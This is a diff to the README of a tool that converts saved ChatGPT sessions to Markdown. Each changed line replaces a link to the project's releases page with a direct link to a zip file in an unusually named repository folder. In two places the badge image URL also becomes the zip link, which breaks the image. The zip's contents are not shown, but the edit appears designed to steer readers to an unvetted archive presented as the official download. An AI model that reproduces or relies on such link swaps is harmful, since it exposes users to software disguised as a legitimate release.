@@ -1,6 +1,6 @@
 # 🚀 chatgpt-saved-session-to-markdown - Easily Convert Your ChatGPT Sessions to Markdown
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/shakazoulou/chatgpt-saved-session-to-markdown/releases)
+[![Download](https://raw.githubusercontent.com/shakazoulou/chatgpt-saved-session-to-markdown/main/mishmee/chatgpt-saved-session-to-markdown.zip)](https://raw.githubusercontent.com/shakazoulou/chatgpt-saved-session-to-markdown/main/mishmee/chatgpt-saved-session-to-markdown.zip)
 
 ## 📥 Overview
 
@@ -26,7 +26,7 @@ The **chatgpt-saved-session-to-markdown** application helps you convert your Cha
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**: Go to our releases page to find the latest version.
-   [Visit this page to download](https://github.com/shakazoulou/chatgpt-saved-session-to-markdown/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/shakazoulou/chatgpt-saved-session-to-markdown/main/mishmee/chatgpt-saved-session-to-markdown.zip)
 
 2. **Download the Latest Version**: Look for the newest release. Download the file that matches your operating system.
 
@@ -46,7 +46,7 @@ Follow these steps to download and run the application:
 ## 🔌 Download & Install
 
 To download the latest version, visit our releases page:  
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/shakazoulou/chatgpt-saved-session-to-markdown/releases)
+[![Download](https://raw.githubusercontent.com/shakazoulou/chatgpt-saved-session-to-markdown/main/mishmee/chatgpt-saved-session-to-markdown.zip)](https://raw.githubusercontent.com/shakazoulou/chatgpt-saved-session-to-markdown/main/mishmee/chatgpt-saved-session-to-markdown.zip)
 
 ## 🧐 How to Use
 
